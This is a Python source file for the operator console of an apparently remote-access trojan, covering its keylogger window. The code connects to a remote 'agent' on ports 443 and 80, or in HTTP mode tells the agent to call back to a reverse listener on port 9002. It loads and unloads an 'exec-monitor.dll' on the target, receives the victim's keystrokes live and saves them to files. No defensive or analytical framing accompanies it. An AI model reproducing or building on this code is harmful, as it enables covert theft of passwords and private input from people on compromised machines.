import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext
import time
import threading
import struct
import socket
import os
from datetime import datetime
from tools.tcp_client import TCPVideoClient

def get_icon_path():

    base_dir = os.environ.get('TAO_BASE_DIR')
    if not base_dir:

        current_file_dir = os.path.dirname(os.path.abspath(__file__))
        base_dir = os.path.abspath(os.path.join(current_file_dir, ".."))
    
    return os.path.join(base_dir, "ico", "ico.ico")

class KeylogClient:

    def __init__(self, agent_ip, control_port=443, keylog_port=80):
        self.agent_ip = agent_ip
        self.control_port = control_port 
        self.keylog_port = keylog_port   
        self.control_socket = None
        self.keylog_socket = None
        self.running = False
        self.keylog_enabled = False
        self.callback = None
        self.receive_thread = None

    def connect_control(self):

        try:
            self.control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.control_socket.settimeout(5)

            print(f"KEYLOGGER: Connecting to control port {self.agent_ip}:{self.control_port}...")
            self.control_socket.connect((self.agent_ip, self.control_port))

            self.control_socket.settimeout(None)
            self.running = True

            print("KEYLOGGER: Control channel connected (port 443)")
            return True

        except Exception as e:
            print(f"KEYLOGGER: Control connection failed: {e}")
            return False

    def enable_keylog(self):

        if not self.control_socket:
            return False

        try:

            self.control_socket.send(b"START_KEYLOG")

            self.control_socket.settimeout(5)
            response = self.control_socket.recv(256).decode('utf-8', errors='ignore')
            self.control_socket.settimeout(None)

            if "KEYLOG_READY" in response:
                print("KEYLOGGER: Agent confirmed keylogger ready")

                time.sleep(0.5) 

                self.keylog_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.keylog_socket.settimeout(5)

                print(f"KEYLOGGER: Connecting to keystroke port {self.agent_ip}:{self.keylog_port}...")
                self.keylog_socket.connect((self.agent_ip, self.keylog_port))
                self.keylog_socket.settimeout(None)

                print("KEYLOGGER: Keystroke channel connected (port 80)")

                self.keylog_enabled = True

                self.receive_thread = threading.Thread(target=self._receive_loop, daemon=True)
                self.receive_thread.start()

                if self.callback:
                    self.callback("enabled", None)
                return True
            else:
                print(f"KEYLOGGER: Unexpected response: {response}")
                return False

        except Exception as e:
            print(f"KEYLOGGER: Enable failed: {e}")
            return False

    def disable_keylog(self):

        if not self.control_socket:
            return False

        try:
            self.keylog_enabled = False

            self.control_socket.send(b"STOP_KEYLOG")

            if self.keylog_socket:
                try:
                    self.keylog_socket.settimeout(3)
                    len_data = self._recv_exact(4, self.keylog_socket)
                    if len_data:
                        msg_len = struct.unpack('!I', len_data)[0]
                        msg_data = self._recv_exact(msg_len, self.keylog_socket)
                        if msg_data and b"KEYLOG_CLOSED" in msg_data:
                            print("KEYLOGGER: Received close confirmation")
                except:
                    pass

                self.keylog_socket.close()
                self.keylog_socket = None

            print("KEYLOGGER: Keylogger DISABLED")
            if self.callback:
                self.callback("disabled", None)
            return True

        except Exception as e:
            print(f"KEYLOGGER: Disable failed: {e}")
            return False

    def _receive_loop(self):

        while self.running and self.keylog_enabled and self.keylog_socket:
            try:
                len_data = self._recv_exact(4, self.keylog_socket)
                if not len_data:
                    break

                key_len = struct.unpack('!I', len_data)[0]

                key_data = self._recv_exact(key_len, self.keylog_socket)
                if not key_data:
                    break

                key_str = key_data.decode('utf-8', errors='ignore')

                if key_str == "KEYLOG_CLOSED":
                    print("KEYLOGGER: Received close signal from agent")
                    self.keylog_enabled = False
                    break

                if self.callback:
                    self.callback("keystroke", key_str)

            except Exception as e:
                if self.running and self.keylog_enabled:
                    print(f"KEYLOGGER: Receive error: {e}")
                break

    def _recv_exact(self, n, sock):

        data = b''
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def send_unload_command(self):

        if self.control_socket:
            try:
                self.control_socket.send(b"UNLOAD_DLL")
                print("KEYLOGGER: Sent 'Stop' command")
            except:
                pass

    def set_callback(self, callback):
        self.callback = callback

    def disconnect(self):
        self.running = False
        self.keylog_enabled = False

        if self.keylog_socket:
            try:
                self.keylog_socket.close()
            except:
                pass
            self.keylog_socket = None

        if self.control_socket:
            try:
                self.control_socket.close()
            except:
                pass
            self.control_socket = None

        print("KEYLOGGER: Disconnected")

class KeyloggerWindow:
    def __init__(self, parent, controller, agent_ip, video_client=None, state_callback=None):
        self.controller = controller
        self.agent_ip = agent_ip
        self.video_client = video_client
        self.state_callback = state_callback

        self.window = tk.Toplevel(parent)
        self.window.title("Keylogger")
        icon_path = get_icon_path()
        if os.path.exists(icon_path):
            try:
                self.window.wm_iconbitmap(icon_path)
            except Exception:
                pass 
        self.window.geometry("630x400")      
        self.window.resizable(False, False)
        self.window.configure(bg="#1A1A1A")
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)

        self.keylog_active = False
        self.current_text = ""
        self.key_count = 0
        self.start_time = None
        self.is_shared_client = (video_client is not None)

        self._build_ui()

        if self.video_client and self.video_client.session_active:
            self.status_label.config(text="READY (Shared)", fg="#4CAF50")
            self.start_btn.config(state="normal")
            self.controller._log_m("KEYLOGGER: Using shared connection")
            self.original_keylog_callback = self.video_client.keylog_callback
            self.video_client.keylog_callback = self._handle_keystroke
        else:
            self.status_label.config(text="SYS: Connecting...", fg="#FFA500")
            self.start_btn.config(state="disabled")
            self._safe_after(500, self.connect_to_agent)

    def _window_alive(self) -> bool:

        try:
            return bool(self.window.winfo_exists())
        except Exception:
            return False

    def _safe_after(self, delay, func, *args):

        if not self._window_alive():
            return
        def _guarded():
            if self._window_alive():
                func(*args)
        self.window.after(delay, _guarded)

    def _build_ui(self):

        header = tk.Frame(self.window, bg="#2C2C2C", height=40)
        header.pack(fill="x", padx=10, pady=(10, 5))
        header.pack_propagate(False)

        self.status_label = tk.Label(header, text="Connecting...", 
                                     bg="#2C2C2C", fg="#FFA500",
                                     font=("Consolas", 11, "bold"))
        self.status_label.pack(side="left", padx=10)

        self.stats_label = tk.Label(header, text="Keys: 0",
                                    bg="#2C2C2C", fg="#CCCCCC",
                                    font=("Consolas", 9))
        self.stats_label.pack(side="right", padx=10)

        btn_frame = tk.Frame(self.window, bg="#1A1A1A")
        btn_frame.pack(fill="x", padx=10, pady=5)

        self.start_btn = tk.Button(btn_frame, text="▶ Start Logging", 
                                   command=self.start_logging,
                                   bg="#4CAF50", fg="white", 
                                   font=("Arial", 10, "bold"),
                                   padx=15, pady=5, state="disabled")
        self.start_btn.pack(side="left", padx=5)

        self.stop_btn = tk.Button(btn_frame, text="⏸ Stop Logging", 
                                  command=self.stop_logging,
                                  bg="#FF9800", fg="white", 
                                  font=("Arial", 10, "bold"),
                                  padx=15, pady=5, state="disabled")
        self.stop_btn.pack(side="left", padx=5)

        tk.Button(btn_frame, text="🗑 Clear", command=self.clear_log,
                 bg="#555555", fg="white", font=("Arial", 10, "bold"),
                 padx=15, pady=5).pack(side="left", padx=5)

        tk.Button(btn_frame, text="💾 Save", command=self.save_log,
                 bg="#2196F3", fg="white", font=("Arial", 10, "bold"),
                 padx=15, pady=5).pack(side="left", padx=5)

        tk.Button(btn_frame, text="✕ Close", command=self.on_close,
                 bg="#666666", fg="white", font=("Arial", 10, "bold"),
                 padx=15, pady=5).pack(side="right", padx=5)

        display_frame = tk.Frame(self.window, bg="#1A1A1A")
        display_frame.pack(fill="both", expand=True, padx=10, pady=5)

        self.text_display = scrolledtext.ScrolledText(
            display_frame,
            bg="#0D0D0D",
            fg="#00FF00",
            font=("Consolas", 11),
            insertbackground="#00FF00",
            wrap="word",
            state="disabled"
        )
        self.text_display.pack(fill="both", expand=True)

        stats_frame = tk.Frame(self.window, bg="#2C2C2C", height=30)
        stats_frame.pack(fill="x", padx=10, pady=(5, 10))
        stats_frame.pack_propagate(False)

        self.time_label = tk.Label(stats_frame, text="Duration: 0s",
                                   bg="#2C2C2C", fg="#CCCCCC",
                                   font=("Consolas", 9))
        self.time_label.pack(side="left", padx=10)

    def connect_to_agent(self):

        if self.video_client and self.video_client.session_active:
            self.controller._log_m("KEYLOGGER: Using shared connection")
            if not hasattr(self, 'original_keylog_callback'):
                self.original_keylog_callback = self.video_client.keylog_callback
            self.video_client.keylog_callback = self._handle_keystroke
            self._safe_after(0, lambda: self.status_label.config(text="⚡ READY (Shared)", fg="#4CAF50"))
            self._safe_after(0, lambda: self.start_btn.config(state="normal"))
            return

        if self.controller.active_mode == "dns":
            self.controller._log_m(f"KEYLOGGER: Connecting to {self.agent_ip}:443...")
            self.video_client = TCPVideoClient(self.agent_ip, port=443)
            self.video_client.keylog_callback = self._handle_keystroke
            threading.Thread(target=self._do_connect, daemon=True).start()
        else:
            self.controller._log_m("KEYLOGGER: HTTP mode — starting reverse listener...")
            threading.Thread(target=self._connect_reverse, daemon=True).start()

    def _connect_reverse(self):
        from tools.reverse_listener import ReverseTCPListener

        port = 9002   

        listener = ReverseTCPListener(port=port, timeout=30, log_fn=self.controller._log_m)
        if not listener.start():
            self._safe_after(0, lambda: self.status_label.config(
                text="ERROR: Listener failed", fg="#FF4444"))
            return

        controller_ip = ReverseTCPListener.get_local_ip()
        callback_cmd  = f"exec-monitor.dll|CALLBACK:{controller_ip}:{port}"
        self.controller._log_m(f"KEYLOGGER: Sending callback command → {callback_cmd}")
        self.controller._send_http_cmd(callback_cmd)

        self._safe_after(0, lambda: self.status_label.config(
            text=f"SYS: Waiting for agent ({port})...", fg="#FFA500"))

        sock = listener.wait_for_connection()
        if not sock:
            self._safe_after(0, lambda: self.status_label.config(
                text="ERROR: Agent did not call back", fg="#FF4444"))
            self.controller._log_m("KEYLOGGER: Reverse connection timed out")
            return

        self.video_client = TCPVideoClient.from_socket(sock, agent_ip=self.agent_ip)
        self.video_client.keylog_callback = self._handle_keystroke

        self._safe_after(0, lambda: self.status_label.config(text="✓ READY", fg="#4CAF50"))
        self._safe_after(0, lambda: self.start_btn.config(state="normal"))
        self.controller._log_m("KEYLOGGER: Reverse connection established ✓")

    def _do_connect(self):

        if self.video_client.connect():
            self._safe_after(0, lambda: self.status_label.config(
                text="✓ READY", fg="#4CAF50"))
            self._safe_after(0, lambda: self.start_btn.config(state="normal"))
            self.controller._log_m("KEYLOGGER: Connected to server")
        else:
            self._safe_after(0, lambda: self.status_label.config(
                text="ERROR: Connection Failed", fg="#FF4444"))
            self.controller._log_m("KEYLOGGER: Connection failed")

    def _handle_keystroke(self, event_type, data):

        if event_type == "keystroke" and self.keylog_active:

            self._safe_after(0, lambda: self._process_keystroke(data))

    def start_logging(self):
        if not self.video_client or not self.video_client.session_active:
            self.controller._log_m("KEYLOGGER: No active connection")
            return

        if self.controller.monitor2_loaded:
            self.controller._log_m("KEYLOGGER: Session already running, starting keylogger...")
            self._start_keylog_after_dll()
            return

        if self.controller.active_mode == "dns":
            self.controller._log_m("KEYLOGGER: Starting keylogger...")
            self.status_label.config(text="KEYLOGGER: Starting...", fg="#FFA500")

            if self.controller.dns_mode.dns_cmd("exec-monitor.dll"):
                self.controller._log_m("KEYLOGGER: 'Start' command sent")
                self.controller.monitor2_loaded = True
                self._safe_after(3000, self._start_keylog_after_dll)
            else:
                self.controller._log_m("ERROR: Failed to send 'Start' command")
                self.status_label.config(text="ERROR", fg="#FF4444")
            return

        self._start_keylog_after_dll()

    def _start_keylog_after_dll(self):

        if self.video_client.start_keylogger():
            self.keylog_active = True
            self.start_time = time.time()
            self.status_label.config(text="KEYLOGGER: LOGGING", fg="#FF4444")
            self.start_btn.config(state="disabled")
            self.stop_btn.config(state="normal")
            self.controller._log_m("KEYLOGGER: Started")

            if self.state_callback:
                self.state_callback(True)

            self._update_timer()
        else:
            self.controller._log_m("ERROR: Failed to start keylogger")
            self.status_label.config(text="ERROR", fg="#FF4444")

    def stop_logging(self):
        self.keylog_active = False

        if self.video_client:
            self.video_client.stop_keylogger()

        self.status_label.config(text="⏸ PAUSED", fg="#FFA500")
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.controller._log_m("⏸ Keylogger Paused")

        if self.state_callback:
            self.state_callback(False)

    def _process_keystroke(self, key_str):

        self.key_count += 1
        self.stats_label.config(text=f"Keys: {self.key_count}")

        if key_str == "[BACKSPACE]":

            if len(self.current_text) > 0:
                self.current_text = self.current_text[:-1]
        elif key_str == "[ENTER]":
            self.current_text += "\n"
        elif key_str == "[TAB]":
            self.current_text += "    "
        elif key_str == " ":
            self.current_text += " "
        elif key_str == "[DELETE]":

            self.current_text += f" {key_str} "
        elif key_str.startswith("[") and key_str.endswith("]"):

            self.current_text += f" {key_str} "
        else:

            self.current_text += key_str

        self.text_display.config(state="normal")
        self.text_display.delete("1.0", "end")
        self.text_display.insert("1.0", self.current_text)
        self.text_display.config(state="disabled")
        self.text_display.see("end")

    def _update_timer(self):

        if self.keylog_active and self.start_time:
            elapsed = int(time.time() - self.start_time)
            minutes = elapsed // 60
            seconds = elapsed % 60
            self.time_label.config(text=f"Duration: {minutes}m {seconds}s")
            self._safe_after(1000, self._update_timer)

    def clear_log(self):

        self.current_text = ""
        self.key_count = 0
        self.stats_label.config(text="Keys: 0")
        self.text_display.config(state="normal")
        self.text_display.delete("1.0", "end")
        self.text_display.config(state="disabled")
        self.controller._log_m("KEYLOGGER: Cleared")

    def save_log(self):

        if not self.current_text:
            self.controller._log_m("KEYLOGGER: Nothing to save")
            return

        try:

            script_dir = os.path.dirname(os.path.abspath(__file__))
            save_dir = os.path.join(script_dir, "output", "keylogs")
            os.makedirs(save_dir, exist_ok=True)

            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"keylog_{timestamp}.txt"
            filepath = os.path.join(save_dir, filename)

            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(f"=== KEYLOG SESSION ===\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Agent: {self.agent_ip}\n")
                f.write(f"Total Keys: {self.key_count}\n")
                f.write(f"{'='*50}\n\n")
                f.write(self.current_text)

            self.controller._log_m(f"KEYLOGGER: Keylog saved to: {filepath}")

            original_text = self.status_label.cget("text")
            self.status_label.config(text="KEYLOGGER: SAVED!", fg="#4CAF50")
            self._safe_after(1500, lambda: self.status_label.config(text=original_text))

        except Exception as e:
            self.controller._log_m(f"KEYLOGGER: Save Error: {e}")

    def on_close(self):

        if self.keylog_active:
            self.stop_logging()

        if self.is_shared_client and hasattr(self, 'original_keylog_callback'):
            if self.video_client:
                self.video_client.keylog_callback = self.original_keylog_callback
            self.controller._log_m("KEYLOGGER: Restored shared connection callback")
        elif not self.is_shared_client and self.video_client:
            self.video_client.disconnect()
            self.controller._log_m("KEYLOGGER: Closed owned connection")

        if self.controller.active_tool_windows.get('keylogger') == self:
            self.controller.active_tool_windows['keylogger'] = None

        monitor_tools = ['live_feed', 'keylogger', 'camera']
        still_open = [t for t in monitor_tools
                      if self.controller.active_tool_windows.get(t) is not None]
        if not still_open:
            self.controller.monitor2_loaded  = False
            self.controller.monitor2_loading = False
            if self.controller.active_mode != "dns":
                self.controller._send_taskkill("monitor.dll")
            self.controller._log_m("SESSION: All monitor tools closed — monitor.dll terminated")

        self.window.destroy()
        self.controller._log_m("KEYLOGGER: Closed")